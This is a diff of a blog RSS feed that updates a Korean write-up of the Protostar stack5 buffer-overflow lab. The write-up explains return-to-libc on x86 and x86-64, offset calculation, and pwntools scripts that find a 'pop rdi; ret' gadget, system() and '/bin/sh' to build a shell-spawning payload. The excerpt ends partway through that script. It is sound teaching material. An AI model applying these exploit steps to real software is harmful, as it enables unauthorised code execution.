@@ -5,23 +5,24 @@
     <description>Harder than you thought, easier than you expected</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sun, 13 Nov 2022 21:46:43 +0900</pubDate>
-    <lastBuildDate>Sun, 13 Nov 2022 21:46:43 +0900</lastBuildDate>
+    <pubDate>Mon, 14 Nov 2022 18:27:20 +0900</pubDate>
+    <lastBuildDate>Mon, 14 Nov 2022 18:27:20 +0900</lastBuildDate>
     <generator>Jekyll v4.2.2</generator>
 
     
       <item>
-        <title>Protostar-stack5.c x86 &amp; x86-64(Updating)</title>
-        <description>&lt;h1 id=&quot;protostar-stack5cupdating&quot;&gt;Protostar-stack5.c(Updating)&lt;/h1&gt;
-
-&lt;p&gt;학교 수업에서 풀이한 문제 중 하나로, x86에서의 RTL과 x86-64에서의 RTL을 모두 실습하기에 좋은 문제인 것 같아 블로그에 기록해본다.&lt;/p&gt;
+        <title>Protostar-stack5.c x86 &amp; x86-64</title>
+        <description>&lt;p&gt;학교 수업에서 풀이한 문제 중 하나로, x86에서의 RTL과 x86-64에서의 RTL을 모두 실습하기에 좋은 문제인 것 같아 블로그에 기록해본다.&lt;/p&gt;
 
 &lt;p&gt;사실 이 문제는 BOF로 쉘코드를 넣으라고 만들어준 문제이긴 하지만, 1) 마음대로 RTL을 하기에도 괜찮아 보이고 2) 32bit로 컴파일 시 메인 함수의 에필로그가 달라지는 문제가 있기에 해결해 보고 싶어 선택했다.&lt;/p&gt;
 
 &lt;hr /&gt;
+
+&lt;hr /&gt;
+
 &lt;h1 id=&quot;0-x86에서의-rtl과-x64에서의-rtl&quot;&gt;0. X86에서의 RTL과 X64에서의 RTL&lt;/h1&gt;
 
-&lt;h2 id=&quot;rtl이란&quot;&gt;RTL이란&lt;/h2&gt;
+&lt;h2 id=&quot;01-rtl이란&quot;&gt;0.1. RTL이란&lt;/h2&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;RTL 이란 Return 2 Library(or Libc)의 약자로, 프로그램 실행 시 해당 언어로 짜인 코드에는 필수적으로 포함되는 라이브러리가(gcc 컴파일러의 경우 libc) 함께 메모리에 로딩되는 점을 악용하여 프로세스 플로우를 해당 라이브러리 내의 원하는 함수로 변경시켜 시스템이 공격자가 원하는 행위를 하도록 조작하는 공격 기법을 의미한다.&lt;/p&gt;
@@ -44,7 +45,7 @@
   &lt;/ul&gt;
 &lt;/blockquote&gt;
 
-&lt;h2 id=&quot;요점&quot;&gt;요점&lt;/h2&gt;
+&lt;h2 id=&quot;02-요점&quot;&gt;0.2. 요점&lt;/h2&gt;
 
 &lt;ol&gt;
   &lt;li&gt;32bit architecture의 함수 calling convention과 64bit architecture의 함수 calling convention은 레지스터 확보 문제로 인해 달라졌다.&lt;/li&gt;
@@ -79,9 +80,10 @@
 &lt;/ol&gt;
 
 &lt;hr /&gt;
+
 &lt;h1 id=&quot;1-x86-기반에서-rtl-수행하기&quot;&gt;1. X86 기반에서 RTL 수행하기&lt;/h1&gt;
 
-&lt;h2 id=&quot;파라미터가-스택에&quot;&gt;파라미터가 스택에?&lt;/h2&gt;
+&lt;h2 id=&quot;11-파라미터가-스택에&quot;&gt;1.1. 파라미터가 스택에?&lt;/h2&gt;
 
 &lt;p&gt;C 언어의 경우 함수의 Calling Convention을 정의해 둔 것은 __cdecl이다. 관련해 좀 더 자세한 설명과 리눅스에서 cdecl 사용을 확인하는 과정은 &lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step5/#/&quot;&gt;여기&lt;/a&gt;&lt;/p&gt;
 
@@ -117,7 +119,7 @@
 
 &lt;p&gt;파라미터는 마지막 파라미터부터 스택에 push된다는 점을 다시 한 번 주지하고자 한다. 왜냐하면 ESP는 pop될 때 낮은 주소에서 높은 주소로 이동하기 때문이다. 즉, 파라미터를 스택에 push한 것과 거꾸로의 순서를 따라 파라미터를 읽어오기 때문에 마지막 파라미터부터 push하는 것이다.&lt;/p&gt;
 
-&lt;h2 id=&quot;rtl을-위한-스택-조작&quot;&gt;RTL을 위한 스택 조작&lt;/h2&gt;
+&lt;h2 id=&quot;12-rtl을-위한-스택-조작&quot;&gt;1.2. RTL을 위한 스택 조작&lt;/h2&gt;
 
 &lt;p&gt;위에서 말한 Cdecl 규약에 따른다면, RTL을 하기 위해서는 어떤 식으로 스택을 조작해야 할까?&lt;/p&gt;
 
@@ -160,7 +162,7 @@
 
 &lt;p&gt;물론 다른 함수 호출 규약을 쓴다면 그건 그거대로 반영해야 할 문제일 테다.&lt;/p&gt;
 
-&lt;h2 id=&quot;실습&quot;&gt;실습&lt;/h2&gt;
+&lt;h2 id=&quot;13-실습&quot;&gt;1.3. 실습&lt;/h2&gt;
 
 &lt;p&gt;어떠한 프로그램을 익스플로잇하기 위해서는 아래와 같은 과정을 거쳐야 한다.&lt;/p&gt;
 
@@ -172,7 +174,7 @@
 
 &lt;p&gt;실습에서는 위의 과정에 따라 순차적으로 익스플로잇 방식을 설명한다.&lt;/p&gt;
 
-&lt;h3 id=&quot;1-대상-프로그램-분석해-취약점-지정&quot;&gt;1. 대상 프로그램 분석해 취약점 지정&lt;/h3&gt;
+&lt;h3 id=&quot;131-대상-프로그램-분석해-취약점-지정&quot;&gt;1.3.1. 대상 프로그램 분석해 취약점 지정&lt;/h3&gt;
 
 &lt;p&gt;프로그램의 소스 코드를 주었기 때문에 문제의 난이도가 낮은 편이다. 아래 소스 코드를 분석하며 취약점을 찾아 보자.&lt;/p&gt;
 
@@ -191,7 +193,7 @@
 
 &lt;p&gt;사용자의 입력값을 받아 지역 변수에 저장하는 간단한 프로그램이다. 그런데, 사용자의 입력값을 받을 때 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt; 함수를 사용했다는 점에서 문제가 있다. 흔히 Boundary check라고 하는 사용자 입력값 길이 확인을 하지 않는 함수이기 때문이다. 즉, 위 프로그램의 문제는 gets 함수를 사용한 것으로, 해당 함수는 사용자가 주는 대로 전부 받아 저장하기 때문에 Buffer Overflow 취약점이 존재하는 함수이기 때문에 위 프로그램 또한 BOF 취약점을 가지게 되었다.&lt;/p&gt;
 
-&lt;h3 id=&quot;2-bof-취약점-익스플로잇할-방법-지정&quot;&gt;2. BOF 취약점 익스플로잇할 방법 지정&lt;/h3&gt;
+&lt;h3 id=&quot;132-bof-취약점-익스플로잇할-방법-지정&quot;&gt;1.3.2. BOF 취약점 익스플로잇할 방법 지정&lt;/h3&gt;
 
 &lt;p&gt;이번에는 BOF와 연계한 RTL 방식으로 쉘을 딸 것이다. BOF-RTL에 사용될 페이로드가 아래와 같기 때문에, 성공시키기 위해 알아야만 하는 정보는&lt;/p&gt;
 
@@ -208,7 +210,7 @@
 &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Library&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;strong&gt;2-1. offset bytes 구하기&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;1.3.2.1. offset bytes 구하기&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;pwndbg를 stack5에 물려 보았다. 컴파일 옵션은 아래와 같다.(주의!! 아래 컴파일 옵션을 사용하면 안된다! &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-mpreferred-stack-boundary=2&lt;/code&gt; 로 해야 한다!!!! 이유는 마지막에 가서 설명하겠다)&lt;/p&gt;
 
@@ -227,7 +229,7 @@
 
 &lt;p&gt;따라서, 0x48byte를 모두 채우면 ebp의 바로 위까지를 변조할 수 있기 때문에 우리가 주어야 할 &lt;strong&gt;offset byte는 0x48+0x4 = 0x4c byte&lt;/strong&gt;가 될 것이다.&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;2-2. Library Function Address와 parameter 로 쓸 문자열 주소 구하기&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;1.3.2.2. Library Function Address와 parameter 로 쓸 문자열 주소 구하기&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;먼저 쉘을 따는 데 사용할 수 있는 libc 내부 함수들이 많지만, 이번에는 system()함수를 사용해 보려 한다. system() 함수의 사용 규약은 아래와 같다.&lt;/p&gt;
 
@@ -294,7 +296,7 @@
   &lt;/li&gt;
 &lt;/ol&gt;
 
-&lt;h3 id=&quot;3-익스플로잇-생성&quot;&gt;3. 익스플로잇 생성&lt;/h3&gt;
+&lt;h3 id=&quot;133-익스플로잇-생성&quot;&gt;1.3.3. 익스플로잇 생성&lt;/h3&gt;
 
 &lt;p&gt;이제까지 알아낸 정보를 취합하면 페이로드의 구조를 아래와 같이 지정할 수 있다.&lt;/p&gt;
 
@@ -342,26 +344,222 @@
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;hr /&gt;
+
 &lt;h1 id=&quot;2-x86-64-기반에서-rtl-수행하기&quot;&gt;2. X86-64 기반에서 RTL 수행하기&lt;/h1&gt;
 
-&lt;p&gt;현재 작성 중…&lt;/p&gt;
+&lt;p&gt;앞서 익스플로잇의 세 단계 중 두 단계를 끝냈기 때문에 이 절에서는 마지막 단계에 대해서만 서술한다.&lt;/p&gt;
 
-&lt;hr /&gt;
-&lt;h1 id=&quot;삽질이-남긴-지식&quot;&gt;삽질이 남긴 지식&lt;/h1&gt;
+&lt;ol&gt;
+  &lt;li&gt;대상 프로그램 분석해 취약점 지정&lt;/li&gt;
+  &lt;li&gt;해당 취약점을 익스플로잇할 방법 지정&lt;/li&gt;
+  &lt;li&gt;익스플로잇 생성&lt;/li&gt;
+&lt;/ol&gt;
 
-&lt;h2 id=&quot;리눅스에서-프로그램-컴파일-시-refer되는-공유-라이브러리와-그-호출-과정&quot;&gt;리눅스에서 프로그램 컴파일 시 refer되는 공유 라이브러리와 그 호출 과정&lt;/h2&gt;
+&lt;h2 id=&quot;21-페이로드가-왜-이-모양이야&quot;&gt;2.1. 페이로드가 왜 이 모양이야?&lt;/h2&gt;
 
-&lt;p&gt;먼저 pwndbg에서 vmmap을 이용해 어떤 라이브러리가 링킹되어 있는지 보자.&lt;/p&gt;
+&lt;p&gt;64비트로 컴파일된 프로그램에 RTL을 하려면 아래와 같은 페이로드를 넣어야 한다.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;offset bytes + Gadget address(pop rdi;ret;) + parameter address + Library function address
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;대체 왜 그런 거지 싶다. 이유는 정말 간단한데, 앞서 설명했던 Cdecl 규정, 함수의 Calling Convention 때문이다. x86-64에서는 함수의 첫 파라미터 6개가 rdi, rsi, rdx, rcx, r8, r9에 순서대로 들어가고, 그러고도 파라미터가 남는다면 뒤에서부터 스택에 들어간다는 것을 꼭 기억하자.&lt;/p&gt;
+
+&lt;p&gt;우리는 system() 함수에 “/bin/sh” 문자열의 주소를 첫 번째이자 마지막 인자로 전달하는 것이 목적이다. 즉, “/bin/sh”의 주소를 rdi에 저장해야만 한다. 그렇게 하기 위해&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;스택 프레임의 ret add에 메모리에 적재된 수많은 인스트럭션 중 어딘가에 있을 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi;ret&lt;/code&gt; 의 주소를 넣고&lt;/li&gt;
+  &lt;li&gt;해당 인스트럭션 중 첫 번째로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi&lt;/code&gt; 가 실행된다면 rsp가 위치한 곳, 즉 현재 ret address의 바로 아래 위치가 rdi에 담기고 rsp가 한 주소 아래로 내려가게 될 것을 이용한다.&lt;/li&gt;
+  &lt;li&gt;직후 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt; 가 실행될 것, 즉 현재 위치한 rsp가 가리키는 스택 위치에 담긴 주소가 rip에 담겨 이다음에 실행될 것을 이용한다.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;이러한 흐름을 성공시키기 위해 페이로드는 위와 같은 형태가 된다.&lt;/p&gt;
+
+&lt;p&gt;이 시점에서 알아내야 하는 정보는 4개로 좁혀진다.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Offset byte의 크기&lt;/li&gt;
+  &lt;li&gt;Gadget의 주소&lt;/li&gt;
+  &lt;li&gt;“/bin/sh”의 주소&lt;/li&gt;
+  &lt;li&gt;system의 주소&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;22-익스플로잇-생성&quot;&gt;2.2. 익스플로잇 생성&lt;/h2&gt;
+
+&lt;h3 id=&quot;221-offset-byte의-크기-알기&quot;&gt;2.2.1. Offset Byte의 크기 알기&lt;/h3&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disas main&lt;/code&gt; 명령어를 이용한다.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2010.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc-2.27.so&lt;/code&gt; 파일과 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld-2.27.so&lt;/code&gt; 파일이 링킹되어 있는 게 보인다. 엥? 그런데 이상하다. 분명히 우리가 ldd, 즉 libc database 커맨드로 확인했을 때 사용된 라이브러리는 아래와 같았다.&lt;/p&gt;
+&lt;p&gt;gets에 들어가는 첫 번째 인자를 저장하는 rdi에 들어가는 값을 확인해 보면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp-0x40&lt;/code&gt; 임을 알 수 있다. 즉, rbp까지를 오염시키기 위해 0x48 bytes가 필요함을 알 수 있다.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;offset byte = 0x48 bytes&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;222-gadget의-주소-알기&quot;&gt;2.2.2. Gadget의 주소 알기&lt;/h3&gt;
+
+&lt;p&gt;목표하는 gadget은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi;ret;&lt;/code&gt; 이다. 이를 찾기 위해 pwntools를 이용한다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2011.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;타겟 프로그램은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/lib/x86_64-linux-gnu/libc.so.6&lt;/code&gt; 을 사용하고 있음을 확인했다.&lt;/p&gt;
+
+&lt;p&gt;따라서 가젯을 찾아오는 스크립트는 아래와 같다.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ROP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;gadget(ret rdi;ret;) = &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find_gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;pop rdi&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;ret&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])))&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;system=&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;system&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh=&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;스크립트 실행 결과는 아래와 같았다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2012.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;앞서 알아둔 라이브러리 시작 주소가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7ffff7a0364f&lt;/code&gt; 이고, 가젯의 오프셋이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x2164f&lt;/code&gt; 이므로 둘을 더한 결과값인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7ffff7a0364f&lt;/code&gt; 에 정말로 가젯이 적재되어 있는지 gdb로 확인해 보자.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2013.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;적재되어 있다.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Gadget address = 0x7ffff7a0364f&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;223-binsh과-system의-주소-알기&quot;&gt;2.2.3. “/bin/sh”과 system의 주소 알기&lt;/h3&gt;
+
+&lt;p&gt;위에서 가젯의 위치를 알아내기 위한 스크립트에서 이미 알아냈기 때문에 값만 쓰고 생략한다.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;System offset = 0x4f420&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh offset = 0x1b3d88&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;일일이 더하고 싶지 않기 때문에 계산은 스크립트에게 맡겨야겠다.&lt;/p&gt;
+
+&lt;h3 id=&quot;224-익스플로잇-생성&quot;&gt;2.2.4. 익스플로잇 생성&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;🤩: 좋아 이제 스크립트만 실행하면 끝이다!&lt;/p&gt;
+
+  &lt;p&gt;🤨: 아니 그런데 왜 안돼&lt;/p&gt;
+
+  &lt;p&gt;🤯: 아 SEGFAULT다&lt;/p&gt;
+
+  &lt;p&gt;💩: 하….&lt;/p&gt;
+
+&lt;/blockquote&gt;
+
+&lt;p&gt;이럴 땐 당황하지 말고 침착하게 트러블슈팅을 시작하면 된다. 물론 나는 너무 당황해서 찔끔 울긴 했는데&lt;/p&gt;
+
+&lt;p&gt;pwntools에서 제공하는 기능 중, gdb에 현재 프로세스를 attach하게 해주는 기능이 있다. 현재 프로세스의 pid를 가져와 그것을 gdb에게 주는 식의 매커니즘인데, 이를 사용하는 방법은 아래와 같다.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ROP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7ffff79e2000&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;gadget_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find_gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;pop rdi&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;ret&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;system_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;system&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;string_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;gadget_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget_offset&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;system_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_offset&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;string_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string_offset&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./stack5_64&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
